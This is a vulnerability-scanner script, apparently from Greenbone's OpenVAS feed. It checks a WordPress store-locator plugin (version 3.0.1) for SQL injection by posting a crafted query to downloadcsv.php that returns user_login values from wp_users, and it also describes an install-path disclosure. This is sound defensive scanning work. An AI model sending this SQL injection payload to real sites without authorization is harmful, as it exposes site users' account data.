# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802644");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-21 12:12:12 +0530 (Thu, 21 Jun 2012)");
  script_name("WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49391");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53795");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/76094");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/store-locator-le/changelog/");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information, compromise the application, access or modify data, exploit
  latent vulnerabilities in the underlying database.");
  script_tag(name:"affected", value:"WordPress Google Maps Via Store Locator Plus Plugin version 3.0.1");
  script_tag(name:"insight", value:"- An error exists due to the application displaying the installation path in
    debug output when accessing wp-content/plugins/store-locator-le/core/load_
    wp_config.php.

  - Input passed via the 'query' parameter to /wp-content/plugins/store-
    locator-le/downloadcsv.php is not properly sanitised before being used
    in a SQL query. This can be exploited to manipulate SQL queries by
    injecting arbitrary SQL code.");
  script_tag(name:"solution", value:"Update to Google Maps Via Store Locator Plus Plugin version 3.0.5 or later.");
  script_tag(name:"summary", value:"WordPress Google Maps Via Store Locator Plus Plugin is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/store-locator-le/downloadcsv.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

req = string(
       "POST ", url, " HTTP/1.1\r\n",
       "Host: ", host, "\r\n",
       "User-Agent: ", useragent, "\r\n",
       "Content-Type: multipart/form-data; boundary=----------------------------7e0b3991dc3a\r\n",
       "Content-Length: 223\r\n\r\n",
       "------------------------------7e0b3991dc3a\r\n",
       'Content-Disposition: form-data; name="query"',"\r\n",
       "\r\n",
       "SELECT concat(0x53514c692d54657374,0x3a,user_login,0x3a,0x53514c692d54657374) FROM wp_users\r\n",
       "------------------------------7e0b3991dc3a--\r\n\r\n" );
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(res && res =~ "SQLi-Test:(.+):SQLi-Test") {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
